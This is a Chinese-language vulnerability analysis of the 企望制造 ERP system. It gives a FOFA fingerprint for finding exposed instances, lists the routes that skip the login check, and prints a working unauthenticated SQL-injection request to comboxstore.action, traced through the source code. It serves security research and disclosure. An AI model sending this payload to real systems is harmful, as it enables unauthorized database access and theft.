FOFA指纹

```
title="企望制造ERP系统"
```

## 框架结构

`web.xml`核心内容如下

```xml
  <filter>
    <filter-name>struts2</filter-name>
    <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
  </filter>
  <filter>
    <filter-name>WitParameterFilter</filter-name>
    <filter-class>com.main.tools.WitParameterFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>WitParameterFilter</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
  <filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>*</url-pattern>
  </filter-mapping>
```

所有的路由都会经过Struts2过滤器处理。那么具体的路由就要从Struts2的配置文件（如struts.xml）中查找。

`struts.xml`部分配置如下。主要配置了拦截器并且包含了其他xml配置文件。

```xml
<interceptors>
    <interceptor name="loginChecked" class="com.main.tools.LoginCheckInterceptor"</interceptor>
    <interceptor name="operationTime" class="com.main.tools.OperationTimeInterceptor"></interceptor>
	 	<interceptor-stack name="witStack">
	 		<interceptor-ref name="loginChecked"></interceptor-ref>
	 		<interceptor-ref name="operationTime"></interceptor-ref>
	 		<interceptor-ref name="defaultStack"></interceptor-ref>
	 	</interceptor-stack>
</interceptors>
<default-interceptor-ref name="witStack"/>
<include file="struts-default.xml"></include> 
<include file="com/config/struts/Adman.xml"></include>
...
<include file="com/config/struts/ECom.xml"></include>
<include file="com/config/struts/Pay.xml"></include>
```

### 路由特点

`com/config/struts/xx.xml`是自定义配置文件，其中包含了Action映射等。以`com/config/struts/MainFunctions.xml`为例，部分配置如下

```xml
	<package name="mainFunctions" extends="ErrorHandler" namespace="/mainFunctions">
		<action name="listallData" class="DrawGridAction" method="listallData"> </action>
		<action name="listData" class="DrawGridAction" method="listData"> </action>
		<action name="drawGrid" class="DrawGridAction" method="drawGrid"> </action>
		...
		<action name="comboxstore" class="DBUtilsAction" method="executeDBList"></action> 
		<action name="eComComboxstore" class="DBUtilsAction" method="eComExecuteDBList"></action> 
		<action name="comboxstorePage" class="DBUtilsAction" method="executeDBListPage"></action> 
	</package>
```

`<package>`标签中的namespace命令空间代表了包的前缀，该package下的所有路由都以`/mainFunctions`为路由前缀。`<action>`标签的name属性代表路由，class属性是相应的处理类。那么访问路由的方式为`'namespace' + 'action_name' + '.action'`。

例如想要访问`DBUtilsAction`，那么对应的路由即为`/mainFunctions/comboxstore.action`

### 拦截器

首先看一下`LoginCheckInterceptor`，从名称上看一般是用于权限控制。拦截器的具体逻辑如下

```java
    public String intercept(ActionInvocation arg0) throws Exception {
        String url = ServletActionContext.getRequest().getRequestURL().toString();
        HttpServletRequest httpRequest = ServletActionContext.getRequest();
        HttpServletResponse httpResponse = ServletActionContext.getResponse();
        httpResponse.setContentType("text/html");
        httpResponse.setCharacterEncoding("UTF-8");
        String header = httpRequest.getHeader("x-requested-with");
        String basePath = httpRequest.getScheme() + "://" + httpRequest.getServerName() + ":" + httpRequest.getServerPort() + httpRequest.getContextPath() + "/";
        if (WitFunction.actionCheck(url)) { // 如果返回true，可以继续执行后续逻辑
            try {
                return arg0.invoke();
            } catch (Exception var9) {
                var9.printStackTrace();
                return this.check(var9, arg0);
            }
        } else if (!httpRequest.isRequestedSessionIdValid()) {
            if (header != null && header.equalsIgnoreCase("XMLHttpRequest")) {
                httpResponse.sendError(999);
                return "ERROR";
            } else {
                return "login";
            }
        } else {
            Staff staff = (Staff)httpRequest.getSession().getAttribute("staff");
            if (staff == null) {
                if (header != null && header.equalsIgnoreCase("XMLHttpRequest")) {
                    httpResponse.sendError(999);
                    return "ERROR";
                } else {
                    return "login";
                }
            } else {
                try {
                    return arg0.invoke();
                } catch (Exception var10) {
                    var10.printStackTrace();
                    return this.check(var10, arg0);
                }
            }
        }
    }
```

如果`WitFunction.actionCheck(url)`可以为true的话，就可以直接执行某个Action的方法。跟进`actionCheck`方法

```java
    public static boolean actionCheck(String url) {
        String SODeliveryLorryAutoAllocateByLorryLoginCookie = (String)WitSession.get("SODeliveryLorryAutoAllocateByLorryLoginCookie");
        boolean checkFlag = false;
        if (!url.contains("staff/staff.action") && !url.contains("staff/initPass.action") && !url.contains("cookieLogin.action") ...) {
            if (!url.contains("staff/EComLogin.action") && !url.contains("staff/EComLogout.action") && ...) {
                if (url.contains("Pay/UnionWapPayResponse.action") || url.contains("Pay/AliWapPayResponse.action") || url.contains("Pay/WechatPayResponse.action")) {
                    checkFlag = true;
                }
            } else {
                checkFlag = true;
            }
        } else {
            checkFlag = true;
        }

        return checkFlag;
    }
```

这个if层次写分为了三层。想要返回true，实际上就是url中包含上述三个if中的任意路由即可

```
# 第一个if
staff/staff.action
staff/initPass.action
cookieLogin.action
mainFunctions/comboxstore.action
staff/generateMacAddress.action
staff/SessionSync.action
DI/DIExecute.action
staff/getAppName.action
staff/getLoginParams.action
staff/CheckCompanyID.action
WEMainImage/getImage.action
mainFunctions/WELanguageObjectGenerate.action
WEOnlineUsersList/drawGrid.action
WEOnlineUsersList/listallData.action
WEOnlineUsersList/WEOnlineUserRemove.action
DI/WeiXinExecute.action
staff/WeiXinLogin.action
staff/MobileCookieLogin.action
staff/MobileLogin.action
/KeyGenEComCustAddressUpdate/
WeiXinStaff/StaffRegist.action
WeiXinStaff/listFields.action
WeiXinStaff/drawGrid.action
GZWeixinStaff/WeixinTokenCheck.action
GZWeixinStaff/MenuCreate.action
DI/DIFileExecute.action
staff/SODeliveryLorryAutoAllocateByLorryLogin.action  StaffAction.SODeliveryLorryAutoAllocateByLorryLogin 
SODeliveryLorry/SODeliveryLorryAutoAllocateByLorry.action
staff/VerifySwitchCheck.action
staff/GetVcodeByVerifyType.action
EComInit/EComInitStore.action
CheckIn/attendanceCheckIn.action
CheckIn/getPersonName.action
# 第二个if
staff/EComLogin.action
staff/EComLogout.action
mainfunctions/GetSmsVcode.action
staff/EComStaff
BoardTypeDefine/getBoardPicture.action
staff/EComAutoLogin.action
DistrictManagement/listDistrictData.action
staff/EComNetWorkIDRecommend.action
EComSheetBoardS/BoardQualityList.action
EComProduct/listallData.action
staff/CheckRequestedSession.action
EComJoinApply/JoinInApply.action
EComSuggestionsAndFeedBack/SuggestionSubmit.action
EComJoinApply/listApplyRecord.action
EComSuggestionsAndFeedBack/listFeedBackRecords.action
# 第三个if
Pay/UnionWapPayResponse.action
Pay/AliWapPayResponse.action
Pay/WechatPayResponse.action
```

## 历史漏洞
### comboxstore sql注入漏洞
```
POST /mainFunctions/comboxstore.action HTTP/1.1
Host: ip:port
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D9A697DEC59C33BC8C75408BF5214207
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

comboxsql=select%20@@version
```

有回显的sql注入漏洞。漏洞位于`MainFunctions.xml`，寻找`comboxstore`的对应配置。

```xml
<action name="comboxstore" class="DBUtilsAction" method="executeDBList"></action> 
```

找到`DBUtilsAction.executeDBList()`

```java
    public void executeDBList() throws Exception {
        HttpServletResponse response = ServletActionContext.getResponse();
        response.setCharacterEncoding("UTF-8");
        String list = this.dbUtilsService.DBListsql(this.comboxsql, this.witParams);
        StringBuffer sbJson = new StringBuffer();
        sbJson.append(list);
        response.getWriter().write(sbJson.toString());
    }
```

struts2的变量如果被声明成这个类的成员变量，就可以通过请求传参，如果参数名称和属性名称一致，struts2会将参数值赋值给属性值。也就是说上面这个方法中的`this.comboxsql`和`this.withParams`分别可以通过`comboxsql=xx`和`withParams=xx`传参。

跟进`DBListsql()`，后续最终调用的是`WitDAO.GetRSMDBySql()`，对sql语句会进行一些处理，然后调用`statament.executeQuery(Sql)`执行。

```java
private WitResultSet GetRSMDBySql(String Sql, String dataSourceName, boolean isprofile, boolean limit, Map witParams) {
	Sql = this.SQLFormat(Sql);
  Sql = WitFunction.replaceRptSql(Sql, dataSourceName);
  Connection con = getConnection(dataSourceName, witParams);
  ResultSet rs = null;
  ResultSetMetaData rsmd = null;
  Statement statement = null;
  WitResultSet witResultSet = new WitResultSet();

  try {
    statement = con.createStatement();
    this.setMaxExecSecThread(witParams, con, Sql, dataSourceName);
    rs = statement.executeQuery(Sql);
    this.setExecSqlFinished(witParams);
  }
}
```

